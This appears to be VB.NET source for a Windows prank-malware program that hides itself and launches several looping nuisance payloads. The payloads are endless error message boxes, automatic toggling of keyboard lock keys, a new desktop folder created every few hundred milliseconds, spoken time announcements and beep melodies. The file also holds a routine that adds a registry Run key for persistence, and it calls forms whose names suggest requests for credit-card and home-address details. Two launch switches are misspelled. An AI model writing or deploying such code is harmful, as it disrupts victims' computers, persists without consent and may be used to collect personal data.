Imports System.Runtime.InteropServices
Imports System.Text
Imports IWshRuntimeLibrary
Public Class Principal
    Dim Argumentos As String

    Private Sub Principal_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Argumentos = Command()
        LeerArgumentos(Argumentos)
    End Sub

#Region "Startup"
    Sub LeerArgumentos(ByVal parametro As String)
        Me.Hide()
        Try
            If parametro = Nothing Then
                'Iniciador de los demas
                Alborotador()
            ElseIf parametro = "/PlaySongs" Then
                PlaySongs()
            ElseIf parametro = "/SerMolesto" Then
                SoyMolesto()
            ElseIf parametro = "/KeyCaps" Then
                KeyCaps()
            ElseIf parametro = "/CloseIt" Then
                CloseIt()
            ElseIf parametro = "/RefreshIt" Then
                RefreshIt()
            ElseIf parametro = "/PocasCarpetas" Then
                PocasCarpetas()
            ElseIf parametro = "/Hablar" Then
                Hablar()
            ElseIf parametro.StartsWith("/AnimeGirlWantsCreditCardInfo") Then
                parametro = parametro.Replace("/AnimeGirlWantsCreditCardInfo", Nothing).TrimStart
                Try
                    Dim args() As String = parametro.Split(" ")
                    Dim contenido As String = Nothing
                    For Each item As String In args
                        contenido &= item & " "
                    Next
                    AnimeGirlWantsCreditCardInfo.Show()
                    AnimeGirlWantsCreditCardInfo.ReadParameters(contenido)
                Catch
                End Try
                AnimeGirlWantsCreditCardInfo.ReadValues()
                AnimeGirlWantsCreditCardInfo.Focus()
            ElseIf parametro.StartsWith("/AnimeSomeoneWantsToKnowWhereYouLive") Then
                parametro = parametro.Replace("/AnimeSomeoneWantsToKnowWhereYouLive", Nothing).TrimStart
                Try
                    Dim args() As String = parametro.Split(" ")
                    Dim contenido As String = Nothing
                    For Each item As String In args
                        contenido &= item & " "
                    Next
                    AnimeSomeoneWantsToKnowWhereYouLive.Show()
                    AnimeSomeoneWantsToKnowWhereYouLive.ReadParameters(contenido)
                Catch
                End Try
                AnimeSomeoneWantsToKnowWhereYouLive.ReadValues()
                AnimeSomeoneWantsToKnowWhereYouLive.Focus()
            ElseIf parametro.StartsWith("/ItsASimpleQuestion") Then
                parametro = parametro.Replace("/ItsASimpleQuestion", Nothing).TrimStart
                Try
                    Dim args() As String = parametro.Split(" ")
                    Dim contenido As String = Nothing
                    For Each item As String In args
                        contenido &= item & " "
                    Next
                    ItsASimpleQuestion.Show()
                    ItsASimpleQuestion.ReadParameters(contenido)
                Catch
                End Try
                ItsASimpleQuestion.ReadValues()
                ItsASimpleQuestion.Focus()
            End If
        Catch ex As Exception

        End Try
    End Sub
    Sub Alborotador()
        Try
            Process.Start(Application.ExecutablePath, "/PlaySongs")

            Process.Start(Application.ExecutablePath, "/SerMolesto")

            Process.Start(Application.ExecutablePath, "/KeyCaps")

            'Process.Start(Application.ExecutablePath, "/RefreshIt") 'Muy, demasiado molesto

            'Process.Start(Application.ExecutablePath, "/CloseIt") 'Muy, demasiado molesto

            Process.Start(Application.ExecutablePath, "/PocasCarpetas")

            Process.Start(Application.ExecutablePath, "/Hablar")

            Process.Start(Application.ExecutablePath, "/AnimeGirlWantsCreditCarInfo")

            Process.Start(Application.ExecutablePath, "/AnimeSomeoneWantToKnowWhereYouLive")

            Process.Start(Application.ExecutablePath, "/ItsASimpleQuestion")

            End
        Catch
        End Try
    End Sub
#End Region

#Region "Payloads"

    Sub SoyMolesto() 'Funciona!
        While True
            MsgBox("Dicen que soy molesto.", MsgBoxStyle.Critical, "¿Soy molesto?")
        End While
    End Sub

    Sub KeyCaps() 'Funciona!
        Dim wshShell As WshShell = New WshShell
        'wshShell = CreateObject("WScript.Shell")
        While True
            Threading.Thread.Sleep(100)
            wshShell.SendKeys("{CAPSLOCK}")
            Threading.Thread.Sleep(50)
            wshShell.SendKeys("{NUMLOCK}")
            Threading.Thread.Sleep(50)
            wshShell.SendKeys("{SCROLLLOCK}")
        End While
    End Sub

    Sub ParaSiempre() 'No se si funciona
        On Error Resume Next
        Dim regKey As Microsoft.Win32.RegistryKey
        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        regKey.SetValue(Application.ProductName, """" & Application.ExecutablePath & """")
        regKey.Close()
    End Sub

    Sub PocasCarpetas() 'Funciona!
        Dim Contador = 0
        While True
            Threading.Thread.Sleep(420)
            System.IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\x" & Contador & "_XD")
            Contador += 1
        End While
    End Sub

    Sub CloseIt() 'Funciona!
        Dim wshShell As WshShell = New WshShell
        'wshShell = CreateObject("WScript.Shell")
        While True
            Threading.Thread.Sleep(500)
            wshShell.SendKeys("%{f4}")
        End While
    End Sub

    Sub RefreshIt() 'Funciona!
        Dim wshShell As WshShell = New WshShell
        'wshShell = CreateObject("WScript.Shell")
        While True
            Threading.Thread.Sleep(500)
            wshShell.SendKeys("{f5}")
        End While
    End Sub

    Sub Hablar() 'Funciona
        While True
            Dim DIME As String = "Son las " &
                      DateTime.Now.ToString("hh") &
                      " horas, con " & DateTime.Now.ToString("mm") &
                      " minutos, y " & DateTime.Now.ToString("ss") &
                      " segundos, " & DateTime.Now.ToString("tt") & ". Del día " & DateTime.Now.ToString("dd") & ", del mes " & DateTime.Now.ToString("MM") & ", del año " & DateTime.Now.ToString("yyyy")
            Dim SAPI = CreateObject("SAPI.SpVoice")
            SAPI.Speak(DIME)
            Threading.Thread.Sleep(3000)
        End While
    End Sub

    Sub PlaySongs() 'Funciona
        Console.Beep(659, 125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(167)
        Console.Beep(523, 125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(784, 125)
        Threading.Thread.Sleep(375)
        Console.Beep(392, 125)
        Threading.Thread.Sleep(375)
        Console.Beep(523, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(392, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(330, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(440, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(494, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(466, 125)
        Threading.Thread.Sleep(42)
        Console.Beep(440, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(392, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(784, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(880, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(698, 125)
        Console.Beep(784, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(523, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(587, 125)
        Console.Beep(494, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(523, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(392, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(330, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(440, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(494, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(466, 125)
        Threading.Thread.Sleep(42)
        Console.Beep(440, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(392, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(784, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(880, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(698, 125)
        Console.Beep(784, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(523, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(587, 125)
        Console.Beep(494, 125)
        Threading.Thread.Sleep(375)
        Console.Beep(784, 125)
        Console.Beep(740, 125)
        Console.Beep(698, 125)
        Threading.Thread.Sleep(42)
        Console.Beep(622, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(167)
        Console.Beep(415, 125)
        Console.Beep(440, 125)
        Console.Beep(523, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(440, 125)
        Console.Beep(523, 125)
        Console.Beep(587, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(784, 125)
        Console.Beep(740, 125)
        Console.Beep(698, 125)
        Threading.Thread.Sleep(42)
        Console.Beep(622, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(167)
        Console.Beep(698, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(698, 125)
        Console.Beep(698, 125)
        Threading.Thread.Sleep(625)
        Console.Beep(784, 125)
        Console.Beep(740, 125)
        Console.Beep(698, 125)
        Threading.Thread.Sleep(42)
        Console.Beep(622, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(167)
        Console.Beep(415, 125)
        Console.Beep(440, 125)
        Console.Beep(523, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(440, 125)
        Console.Beep(523, 125)
        Console.Beep(587, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(622, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(587, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(523, 125)
        Threading.Thread.Sleep(1125)
        Console.Beep(784, 125)
        Console.Beep(740, 125)
        Console.Beep(698, 125)
        Threading.Thread.Sleep(42)
        Console.Beep(622, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(167)
        Console.Beep(415, 125)
        Console.Beep(440, 125)
        Console.Beep(523, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(440, 125)
        Console.Beep(523, 125)
        Console.Beep(587, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(784, 125)
        Console.Beep(740, 125)
        Console.Beep(698, 125)
        Threading.Thread.Sleep(42)
        Console.Beep(622, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(167)
        Console.Beep(698, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(698, 125)
        Console.Beep(698, 125)
        Threading.Thread.Sleep(625)
        Console.Beep(784, 125)
        Console.Beep(740, 125)
        Console.Beep(698, 125)
        Threading.Thread.Sleep(42)
        Console.Beep(622, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(659, 125)
        Threading.Thread.Sleep(167)
        Console.Beep(415, 125)
        Console.Beep(440, 125)
        Console.Beep(523, 125)
        Threading.Thread.Sleep(125)
        Console.Beep(440, 125)
        Console.Beep(523, 125)
        Console.Beep(587, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(622, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(587, 125)
        Threading.Thread.Sleep(250)
        Console.Beep(523, 125)

        Threading.Thread.Sleep(1500) '1 segundo y medio

        Console.Beep(784, 150)
        Threading.Thread.Sleep(300)
        Console.Beep(784, 150)
        Threading.Thread.Sleep(300)
        Console.Beep(932, 150)
        Threading.Thread.Sleep(150)
        Console.Beep(1047, 150)
        Threading.Thread.Sleep(150)
        Console.Beep(784, 150)
        Threading.Thread.Sleep(300)
        Console.Beep(784, 150)
        Threading.Thread.Sleep(300)
        Console.Beep(699, 150)
        Threading.Thread.Sleep(150)
        Console.Beep(740, 150)
        Threading.Thread.Sleep(150)
        Console.Beep(784, 150)
        Threading.Thread.Sleep(300)
        Console.Beep(784, 150)
        Threading.Thread.Sleep(300)
        Console.Beep(932, 150)
        Threading.Thread.Sleep(150)
        Console.Beep(1047, 150)
        Threading.Thread.Sleep(150)
        Console.Beep(784, 150)
        Threading.Thread.Sleep(300)
        Console.Beep(784, 150)
        Threading.Thread.Sleep(300)
        Console.Beep(699, 150)
        Threading.Thread.Sleep(150)
        Console.Beep(740, 150)
        Threading.Thread.Sleep(150)
        Console.Beep(932, 150)
        Console.Beep(784, 150)
        Console.Beep(587, 1200)
        Threading.Thread.Sleep(75)
        Console.Beep(932, 150)
        Console.Beep(784, 150)
        Console.Beep(554, 1200)
        Threading.Thread.Sleep(75)
        Console.Beep(932, 150)
        Console.Beep(784, 150)
        Console.Beep(523, 1200)
        Threading.Thread.Sleep(150)
        Console.Beep(466, 150)
        Console.Beep(523, 150)

        Threading.Thread.Sleep(1500)

        Console.Beep(658, 125)
        Console.Beep(1320, 500)
        Console.Beep(990, 250)
        Console.Beep(1056, 250)
        Console.Beep(1188, 250)
        Console.Beep(1320, 125)
        Console.Beep(1188, 125)
        Console.Beep(1056, 250)
        Console.Beep(990, 250)
        Console.Beep(880, 500)
        Console.Beep(880, 250)
        Console.Beep(1056, 250)
        Console.Beep(1320, 500)
        Console.Beep(1188, 250)
        Console.Beep(1056, 250)
        Console.Beep(990, 750)
        Console.Beep(1056, 250)
        Console.Beep(1188, 500)
        Console.Beep(1320, 500)
        Console.Beep(1056, 500)
        Console.Beep(880, 500)
        Console.Beep(880, 500)
        Threading.Thread.Sleep(250)
        Console.Beep(1188, 500)
        Console.Beep(1408, 250)
        Console.Beep(1760, 500)
        Console.Beep(1584, 250)
        Console.Beep(1408, 250)
        Console.Beep(1320, 750)
        Console.Beep(1056, 250)
        Console.Beep(1320, 500)
        Console.Beep(1188, 250)
        Console.Beep(1056, 250)
        Console.Beep(990, 500)
        Console.Beep(990, 250)
        Console.Beep(1056, 250)
        Console.Beep(1188, 500)
        Console.Beep(1320, 500)
        Console.Beep(1056, 500)
        Console.Beep(880, 500)
        Console.Beep(880, 500)
        Threading.Thread.Sleep(500)
        Console.Beep(1320, 500)
        Console.Beep(990, 250)
        Console.Beep(1056, 250)
        Console.Beep(1188, 250)
        Console.Beep(1320, 125)
        Console.Beep(1188, 125)
        Console.Beep(1056, 250)
        Console.Beep(990, 250)
        Console.Beep(880, 500)
        Console.Beep(880, 250)
        Console.Beep(1056, 250)
        Console.Beep(1320, 500)
        Console.Beep(1188, 250)
        Console.Beep(1056, 250)
        Console.Beep(990, 750)
        Console.Beep(1056, 250)
        Console.Beep(1188, 500)
        Console.Beep(1320, 500)
        Console.Beep(1056, 500)
        Console.Beep(880, 500)
        Console.Beep(880, 500)
        Threading.Thread.Sleep(250)
        Console.Beep(1188, 500)
        Console.Beep(1408, 250)
        Console.Beep(1760, 500)
        Console.Beep(1584, 250)
        Console.Beep(1408, 250)
        Console.Beep(1320, 750)
        Console.Beep(1056, 250)
        Console.Beep(1320, 500)
        Console.Beep(1188, 250)
        Console.Beep(1056, 250)
        Console.Beep(990, 500)
        Console.Beep(990, 250)
        Console.Beep(1056, 250)
        Console.Beep(1188, 500)
        Console.Beep(1320, 500)
        Console.Beep(1056, 500)
        Console.Beep(880, 500)
        Console.Beep(880, 500)
        Threading.Thread.Sleep(500)
        Console.Beep(660, 1000)
        Console.Beep(528, 1000)
        Console.Beep(594, 1000)
        Console.Beep(495, 1000)
        Console.Beep(528, 1000)
        Console.Beep(440, 1000)
        Console.Beep(419, 1000)
        Console.Beep(495, 1000)
        Console.Beep(660, 1000)
        Console.Beep(528, 1000)
        Console.Beep(594, 1000)
        Console.Beep(495, 1000)
        Console.Beep(528, 500)
        Console.Beep(660, 500)
        Console.Beep(880, 1000)
        Console.Beep(838, 2000)
        Console.Beep(660, 1000)
        Console.Beep(528, 1000)
        Console.Beep(594, 1000)
        Console.Beep(495, 1000)
        Console.Beep(528, 1000)
        Console.Beep(440, 1000)
        Console.Beep(419, 1000)
        Console.Beep(495, 1000)
        Console.Beep(660, 1000)
        Console.Beep(528, 1000)
        Console.Beep(594, 1000)
        Console.Beep(495, 1000)
        Console.Beep(528, 500)
        Console.Beep(660, 500)
        Console.Beep(880, 1000)
        Console.Beep(838, 2000)
    End Sub

#End Region
End Class
Module Utility
    <DllImport("kernel32")>
    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
    End Function
    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
End Module